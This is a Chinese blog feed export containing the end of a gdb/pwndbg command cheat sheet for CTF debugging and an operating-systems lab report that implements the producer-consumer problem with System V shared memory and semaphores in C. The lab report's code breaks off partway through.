按十进制格式显示变量。<br>u 按十六进制格式显示无符号整型。<br>o 按八进制格式显示变量。<br>t 按二进制格式显示变量。<br>a 按十六进制格式显示变量。<br>c 按字符格式显示变量。<br>f 按浮点数格式显示变量。<br>s 按字符串显示。<br>b 按字符显示。<br>i 显示汇编指令。</li></ul></li></ul></li><li><p><code>x /10gx 0x123456</code> //<strong>常用</strong>，从0x123456开始每个单元八个字节，十六进制显示是个单元的数据</p></li><li><p><code>x /10xd $rdi</code> //从rdi指向的地址向后打印10个单元，每个单元4字节的十进制数</p></li><li><p><code>x /10i 0x123456</code> //<strong>常用</strong>，从0x123456处向后显示十条汇编指令</p></li></ul><h4 id="打印指令pprint"><a class="markdownIt-Anchor" href="#打印指令pprint"></a> <strong>打印指令p(print)：</strong></h4><ul><li><code>p fun_name</code> //打印fun_name的地址，需要保留符号</li><li><code>p 0x10-0x08</code> //计算0x10-0x08的结果</li><li><code>p &amp;a</code> //查看变量a的地址</li><li><code>p *(0x123456)</code> //查看0x123456地址的值，注意和x指令的区别，x指令查看地址的值不用星号</li><li><code>p $rdi</code> //显示rdi寄存器的值，注意和x的区别，这只是显示rdi的值，而不是rdi指向的值</li><li><code>p *($rdi)</code> //显示rdi指向的值</li></ul><h4 id="打印汇编指令disass"><a class="markdownIt-Anchor" href="#打印汇编指令disass"></a> <strong>打印汇编指令disass</strong>：</h4><p><strong>disassemble</strong>的缩写</p><ul><li><code>disass 0x123456</code> //显示0x123456前后的汇编指令</li><li><code>x /10i 0x123456</code>//x也可以显示指令，i就表示打印汇编指令</li></ul><h4 id="打印源代码指令list"><a class="markdownIt-Anchor" href="#打印源代码指令list"></a> <strong>打印源代码指令list：</strong></h4><ul><li><code>list</code> //查看当前附近10行代码，要有源码，list指令pwn题中几乎不用，但为了完整性还是简单举几个例子</li><li><code>list 38</code> //查看38行附近10行代码</li><li><code>list 1,10</code> //查看1-10行</li><li><code>list main</code> //查看main函数开始10行</li></ul><h3 id="修改和查找指令"><a class="markdownIt-Anchor" href="#修改和查找指令"></a> <strong>修改和查找指令</strong></h3><h4 id="修改数据指令set"><a class="markdownIt-Anchor" href="#修改数据指令set"></a> <strong>修改数据指令set：</strong></h4><ul><li><code>set $​rdi=0x10</code> //把rdi寄存器的值变为0x10</li><li><code>set *(0x123456)=0x10</code> //0x123456地址的值变为0x10，注意带星号</li><li><code>set args “abc” “def” “gh“</code>//给参数123赋值</li><li><code>set args “python -c ‘print</code> “1234\x7f\xde”’” //使用python给参数赋值不可见字符</li></ul><h4 id="查找数据"><a class="markdownIt-Anchor" href="#查找数据"></a> <strong>查找数据：</strong></h4><ul><li><code>search rdi</code> //从当前位置向后查包含rdi的指令，返回若干</li><li><code>search -h</code> //查看search帮助，我也不太长用这个指令</li><li><code>find “hello”</code> //查找hello字符串，pwndbg独有</li><li><code>ropgadget</code> //查找ropgadget，pwndbg独有，没啥用，可以用其他工具</li></ul><h3 id="堆操作指令"><a class="markdownIt-Anchor" href="#堆操作指令"></a> 堆操作指令</h3><p>pwndbg插件独有</p><ul><li><code>arena</code> //显示arena的详细信息</li><li><code>arenas</code> //显示所有arena的基本信息</li><li><code>arenainfo</code> //好看的显示所有arena的信息</li><li><code>bins</code> //常用，查看所有种类的堆块的链表情况</li><li><code>fastbins</code> //单独查看fastbins的链表情况</li><li><code>largebins</code> //同上，单独查看largebins的链表情况</li><li><code>smallbins</code> //同上，单独查看smallbins的链表情况</li><li><code>unsortedbin</code> //同上，单独查看unsortedbin链表情况</li><li><code>tcachebins</code> //同上，单独查看tcachebins的链表情况</li><li><code>tcache</code> //查看tcache详细信息</li><li><code>heap</code> //数据结构的形式显示所有堆块，会显示一大堆</li><li><code>heapbase</code> //查看堆起始地址</li><li><code>heapinfo、heapinfoall</code> //显示堆得信息，和bins的挺像的，没bins好用</li><li><code>parseheap</code> //显示堆结构，很好用</li><li><code>tracemalloc</code> //好用，会跟提示所有操作堆的地方</li></ul><h3 id="其他pwndbg插件独有指令"><a class="markdownIt-Anchor" href="#其他pwndbg插件独有指令"></a> <strong>其他pwndbg插件独有指令</strong></h3><ul><li><p><code>cyclc 50</code> //生成50个用来溢出的字符，如：aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama</p></li><li><p><code>$reabse</code> //开启PIE的情况的地址偏移</p></li><li><p><code>b *$reabse(0x123456)</code> //断住PIE状态下的二进制文件中0x123456的地方</p></li><li><p><code>codebase</code> //打印PIE偏移，与rebase不同，这是打印，rebase是使用</p></li><li><p><code>stack</code> //查看栈</p></li><li><p><code>retaddr</code> //打印包含返回地址的栈地址</p></li><li><p><code>canary</code> //直接看canary的值</p></li><li><p><code>plt</code> //查看plt表</p></li><li><p><code>got</code> //查看got表</p></li><li><p><code>hexdump</code> //想IDA那样显示数据，带字符串</p></li></ul><p>参考链接：<a href="https://blog.csdn.net/Breeze_CAT/article/details/103789233">gdb+pwndbg食用指南</a></p>]]></content>
    
    
    <categories>
      
      <category>Memo</category>
      
      <category>Install and Configue</category>
      
      <category>Learing Record</category>
      
    </categories>
    
    
    <tags>
      
      <tag>gdb</tag>
      
      <tag>install</tag>
      
      <tag>learning record</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>操作系统Lab6-生产者消费者问题</title>
    <link href="/posts/3994810f/"/>
    <url>/posts/3994810f/</url>
    
    <content type="html"><![CDATA[<h2 id="一-实验内容"><a class="markdownIt-Anchor" href="#一-实验内容"></a> 一、实验内容</h2><ul><li>模拟操作系统中进程同步和互斥。</li></ul><h2 id="二-实验目的"><a class="markdownIt-Anchor" href="#二-实验目的"></a> 二、实验目的</h2><ul><li>熟悉临界资源、信号量及PV操作的定义与物理意义</li><li>了解进程通信的方法</li><li>掌握进程互斥与进程同步的相关知识</li><li>掌握用信号量机制解决进程之间的同步与互斥问题</li><li>实现生产者－消费者问题，深刻理解进程同步问题</li></ul><h2 id="三-实验题目"><a class="markdownIt-Anchor" href="#三-实验题目"></a> 三、实验题目</h2><h3 id="进程实现"><a class="markdownIt-Anchor" href="#进程实现"></a> 进程实现</h3><p>在Linux操作系统下用C实现经典同步问题：生产者—消费者，具体要求如下：</p><ol><li>一个大小为10的缓冲区，初始状态为空。</li><li>2个生产者，随机等待一段时间，往缓冲区中添加数据，若缓冲区已满，等待消费者取走数据之后再添加，重复10次。</li><li>2个消费者，随机等待一段时间，从缓冲区中读取数据，若缓冲区为空，等待生产者添加数据之后再读取，重复10次。</li></ol><p><strong>提示</strong><br>本实验的主要目的是模拟操作系统中进程同步和互斥。在系统进程并发执行异步推进的过程中，由于资源共享和进程间合作而造成进程间相互制约。进程间的相互制约有两种不同的方式。</p><ol><li>间接制约。这是由于多个进程共享同一资源（如CPU、共享输入/输出设备）而引起的，即共享资源的多个进程因系统协调使用资源而相互制约。</li><li>直接制约。只是由于进程合作中各个进程为完成同一任务而造成的，即并发进程各自的执行结果互为对方的执行条件，从而限制各个进程的执行速度。</li></ol><p>生产者和消费者是经典的进程同步问题，在这个问题中，生产者不断的向缓冲区中写入数据，而消费者则从缓冲区中读取数据。生产者进程和消费者对缓冲区的操作是互斥，即当前只能有一个进程对这个缓冲区进行操作，生产者进入操作缓冲区之前，先要看缓冲区是否已满，如果缓冲区已满，则它必须等待消费者进程将数据取出才能写入数据，同样的，消费者进程从缓冲区读取数据之前，也要判断缓冲区是否为空，如果为空，则必须等待生产者进程写入数据才能读取数据。</p><p>在这个问题当中，我们采用信号量机制进行进程之间的通信，设置两个信号量，空的信号量和满的信号量。在Linux系统中，一个或多个信号量构成一个信号量集合。使用信号量机制可以实现进程之间的同步和互斥，允许并发进程一次对一组信号量进行相同或不同的操作。每个P、V操作不限于减1或加1，而是可以加减任何整数。在进程终止时，系统可根据需要自动消除所有被进程操作过的信号量的影响</p><ol><li><p>缓冲区采用循环队列表示，利用头、尾指针来存放、读取数据，以及判断队列是否为空。缓冲区中数组大小为10；</p></li><li><p>利用随机函数rand()得到A～Z的一个随机字符，作为生产者每次生产的数据，存放到缓冲区中；</p></li><li><p>使用shmget()系统调用实现共享主存段的创建，shmget()返回共享内存区的ID。对于已经申请到的共享段，进程需把它附加到自己的虚拟空间中才能对其进行读写。</p></li><li><p>信号量的建立采用semget()函数，同时建立信号量的数量。在信号量建立后，调用semctl()对信号量进行初始化，例如本实验中，可以建立两个信号量SEM_EMPTY、SEM_FULL，初始化时设置SEM_EMPTY为10，SEM_FULL为0。使用操作信号的函数semop()做排除式操作，使用这个函数防止对共享内存的同时操作。对共享内存操作完毕后采用shmctl()函数撤销共享内存段。</p></li><li><p>使用循环，创建2个生产者以及2个消费者，采用函数fork()创建一个新的进程。</p></li><li><p>一个进程的一次操作完成后，采用函数fflush()刷新缓冲区。</p></li><li><p>程序最后使用semctl()函数释放内存。</p></li></ol><ul><li>主程序流程图：</li></ul><p><img src="/posts/3994810f/image-20211130105214487.png" alt="image-20211130105214487"></p><ul><li>生产者进程流程图</li></ul><p><img src="/posts/3994810f/image-20211130105238309.png" alt="image-20211130105238309"></p><ul><li>消费者进程流程图</li></ul><p><img src="/posts/3994810f/image-20211130105350695.png" alt="image-20211130105350695"></p><ul><li>P操作流程图</li></ul><p><img src="/posts/3994810f/image-20211130105635105.png" alt="image-20211130105635105"></p><ul><li>V操作流程图</li></ul><p><img src="/posts/3994810f/image-20211130105654202.png" alt="image-20211130105654202"></p><h3 id="思考题-线程实现"><a class="markdownIt-Anchor" href="#思考题-线程实现"></a> 思考题 线程实现</h3><p>采用线程来实现</p><h2 id="四-实验设计与过程"><a class="markdownIt-Anchor" href="#四-实验设计与过程"></a> 四、实验设计与过程</h2><h3 id="进程实现-2"><a class="markdownIt-Anchor" href="#进程实现-2"></a> 进程实现</h3><h4 id="预备知识"><a class="markdownIt-Anchor" href="#预备知识"></a> 预备知识</h4><p>与信号量一样，在Linux中也提供了一组函数接口用于使用共享内存，而且使用共享共存的接口还与信号量的非常相似，而且比使用信号量的接口来得简单。它们声明在头文件 sys/shm.h 中。</p><h5 id="1-shmget函数"><a class="markdownIt-Anchor" href="#1-shmget函数"></a> 1、shmget()函数</h5><p>该函数用来创建共享内存，它的原型为：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">shmget</span><span class="hljs-params">(<span class="hljs-keyword">key_t</span> key, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">int</span> shmflg)</span></span>;<br></code></pre></div></td></tr></table></figure><ul><li><p>第一个参数，与信号量的semget函数一样，程序需要提供一个参数key（非0整数），它有效地为共享内存段命名，shmget()函数成功时返回一个与key相关的共享内存标识符（非负整数），用于后续的共享内存函数。调用失败返回-1.</p><p>不相关的进程可以通过该函数的返回值访问同一共享内存，它代表程序可能要使用的某个资源，程序对所有共享内存的访问都是间接的，程序先通过调用shmget()函数并提供一个键，再由系统生成一个相应的共享内存标识符（shmget()函数的返回值），只有shmget()函数才直接使用信号量键，所有其他的信号量函数使用由semget函数返回的信号量标识符。</p></li><li><p>第二个参数，size以字节为单位指定需要共享的内存容量</p></li><li><p>第三个参数，shmflg是权限标志，它的作用与open函数的mode参数一样，如果要想在key标识的共享内存不存在时，创建它的话，可以与IPC_CREAT做或操作。共享内存的权限标志与文件的读写权限一样，举例来说，0644,它表示允许一个进程创建的共享内存被内存创建者所拥有的进程向共享内存读取和写入数据，同时其他用户创建的进程只能读取共享内存。</p></li></ul><h5 id="2-shmat函数"><a class="markdownIt-Anchor" href="#2-shmat函数"></a> 2、shmat()函数</h5><p>– at：attach</p><p>第一次创建完共享内存时，它还不能被任何进程访问，shmat()函数的作用就是用来启动对该共享内存的访问，并把共享内存连接到当前进程的地址空间。它的原型如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">shmat</span><span class="hljs-params">(<span class="hljs-keyword">int</span> shm_id, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *shm_addr, <span class="hljs-keyword">int</span> shmflg)</span></span>;<br></code></pre></div></td></tr></table></figure><ul><li><p>第一个参数，shm_id是由shmget()函数返回的共享内存标识。</p></li><li><p>第二个参数，shm_addr指定共享内存连接到当前进程中的地址位置，通常为空，表示让系统来选择共享内存的地址。</p></li><li><p>第三个参数，shm_flg是一组标志位，通常为0。</p></li></ul><p>调用成功时返回一个指向共享内存第一个字节的指针，如果调用失败返回-1.</p><h5 id="3-shmdt函数"><a class="markdownIt-Anchor" href="#3-shmdt函数"></a> 3、shmdt()函数</h5><p>– dt：detach</p><p>该函数用于将共享内存从当前进程中分离。注意，将共享内存分离并不是删除它，只是使该共享内存对当前进程不再可用。它的原型如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">shmdt</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *shmaddr)</span></span>;<br></code></pre></div></td></tr></table></figure><p>参数shmaddr是shmat()函数返回的地址指针，调用成功时返回0，失败时返回-1.</p><h5 id="4-shmctl函数"><a class="markdownIt-Anchor" href="#4-shmctl函数"></a> 4、shmctl()函数</h5><p>– ctl：control</p><p>与信号量的semctl()函数一样，用来控制共享内存，它的原型如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">shmctl</span><span class="hljs-params">(<span class="hljs-keyword">int</span> shm_id, <span class="hljs-keyword">int</span> command, struct shmid_ds *buf)</span></span>;<br></code></pre></div></td></tr></table></figure><ul><li><p>第一个参数，shm_id是shmget()函数返回的共享内存标识符。</p></li><li><p>第二个参数，command是要采取的操作，它可以取下面的三个值 ：</p><ul><li>IPC_STAT：把shmid_ds结构中的数据设置为共享内存的当前关联值，即用共享内存的当前关联值覆盖shmid_ds的值。</li><li>IPC_SET：如果进程有足够的权限，就把共享内存的当前关联值设置为shmid_ds结构中给出的值</li><li>IPC_RMID：删除共享内存段</li></ul></li><li><p>第三个参数，buf是一个结构指针，它指向共享内存模式和访问权限的结构。</p><p>shmid_ds结构 至少包括以下成员：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shmid_ds</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">uid_t</span> shm_perm.uid;<br>    <span class="hljs-keyword">uid_t</span> shm_perm.gid;<br>    <span class="hljs-keyword">mode_t</span> shm_perm.mode;<br>&#125;;<br></code></pre></div></td></tr></table></figure></li></ul><h4 id="数据结构和符号说明"><a class="markdownIt-Anchor" href="#数据结构和符号说明"></a> <strong>数据结构</strong>和符号说明</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//信号集合内的每个信号量的索引,</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SEM_FULL 0</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SEM_EMPTY 1</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MUTEX 2</span><br><span class="hljs-comment">//缓冲区结构</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">my_buffer</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">int</span> out;<br><span class="hljs-keyword">int</span> in;<br><span class="hljs-keyword">char</span> str[MAX_BUFFER_SIZE];<br><span class="hljs-keyword">int</span> num; <span class="hljs-comment">//缓冲区里字母数量</span><br><span class="hljs-keyword">int</span> is_empty;<br>&#125;;<br><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N_CONSUMER = <span class="hljs-number">2</span>;  <span class="hljs-comment">//消费者数量</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N_PRODUCER = <span class="hljs-number">2</span>;  <span class="hljs-comment">//生产者数量</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N_BUFFER = <span class="hljs-number">10</span>;   <span class="hljs-comment">//缓冲区容量</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N_WORKTIME = <span class="hljs-number">10</span>; <span class="hljs-comment">//工作次数</span><br><br><span class="hljs-keyword">int</span> shm_id = <span class="hljs-number">-1</span>;<span class="hljs-comment">//信号量id</span><br><br><span class="hljs-keyword">int</span> sem_id = <span class="hljs-number">-1</span>;<span class="hljs-comment">//共享内存id</span><br><span class="hljs-comment">//子进程的id</span><br><span class="hljs-keyword">pid_t</span> consumer_id;<br><span class="hljs-keyword">pid_t</span> producer_id;<br><span class="hljs-comment">//得到10以内的一个随机数</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">get_random</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span><br><span class="hljs-function"><span class="hljs-comment">//sem_id 表示信号量集合的 id</span></span><br><span class="hljs-function"><span class="hljs-comment">//sem_num 表示要处理的信号量在信号量集合中的索引</span></span><br><span class="hljs-function"><span class="hljs-comment">//P操作</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">waitSem</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sem_id, <span class="hljs-keyword">int</span> sem_num)</span></span><br><span class="hljs-function"><span class="hljs-comment">//V操作</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">signalSem</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sem_id, <span class="hljs-keyword">int</span> sem_num)</span></span><br><span class="hljs-function"><span class="hljs-comment">//打印进程运行时间</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">printTime</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-comment">//消费者进程的消费和信息打印</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">consume_print</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i, struct my_buffer *shmptr)</span></span><br><span class="hljs-function"><span class="hljs-comment">//消费者进程的消费和信息打印</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">consume_print</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i, struct my_buffer *shmptr)</span></span><br></code></pre></div></td></tr></table></figure><h4 id="源代码"><a class="markdownIt-Anchor" href="#源代码"></a> 源代码</h4><p>在main函数中，首先初始化信号量（mutex表示缓冲区的互斥访问，设为1；SEM_FULL表示缓冲区满的数量，设为0；SEM_EMPTY表示缓冲区空的数量，设为10），分配共享内存，初始化缓冲区，创建生产者与消费者，释放内存再退出。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/shm.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/wait.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_BUFFER_SIZE 10</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SHM_MODE 0600</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SEM_MODE 0600</span><br><span class="hljs-comment">//信号集合内的每个信号量的索引,</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SEM_FULL 0</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SEM_EMPTY 1</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MUTEX 2</span><br><span class="hljs-comment">//缓冲区结构</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">my_buffer</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">int</span> out;<br><span class="hljs-keyword">int</span> in;<br><span class="hljs-keyword">char</span> str[MAX_BUFFER_SIZE];<br><span class="hljs-keyword">int</span> num; <span class="hljs-comment">//缓冲区里字母数量</span><br><span class="hljs-keyword">int</span> is_empty;<br>&#125;;<br><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N_CONSUMER = <span class="hljs-number">2</span>;  <span class="hljs-comment">//消费者数量</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N_PRODUCER = <span class="hljs-number">2</span>;  <span class="hljs-comment">//生产者数量</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N_BUFFER = <span class="hljs-number">10</span>;   <span class="hljs-comment">//缓冲区容量</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N_WORKTIME = <span class="hljs-number">10</span>; <span class="hljs-comment">//工作次数</span><br><span class="hljs-comment">//信号量id</span><br><span class="hljs-keyword">int</span> shm_id = <span class="hljs-number">-1</span>;<br><span class="hljs-comment">//共享内存id</span><br><span class="hljs-keyword">int</span> sem_id = <span class="hljs-number">-1</span>;<br><span class="hljs-comment">//子进程的id</span><br><span class="hljs-keyword">pid_t</span> consumer_id;<br><span class="hljs-keyword">pid_t</span> producer_id;<br><span class="hljs-comment">//得到10以内的一个随机数</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span 